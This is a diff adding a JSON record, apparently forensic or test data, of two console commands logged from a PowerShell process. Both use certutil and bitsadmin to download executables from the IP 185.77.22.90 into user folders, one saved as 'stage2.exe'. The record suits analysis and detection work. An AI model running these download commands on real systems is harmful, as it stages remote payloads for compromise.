@@ -1,0 +1,16 @@
+[
+  {
+    "PID": 2800,
+    "Process": "powershell.exe",
+    "Title": "Windows PowerShell",
+    "AttachedProcess": "powershell.exe",
+    "Cmd": "certutil -urlcache -split -f http://185.77.22.90/upd.exe C:\\Users\\Public\\upd.exe"
+  },
+  {
+    "PID": 2800,
+    "Process": "powershell.exe",
+    "Title": "Windows PowerShell",
+    "AttachedProcess": "powershell.exe",
+    "Cmd": "bitsadmin /transfer job http://185.77.22.90/s2.bin C:\\Users\\jdoe\\AppData\\Roaming\\stage2.exe"
+  }
+]
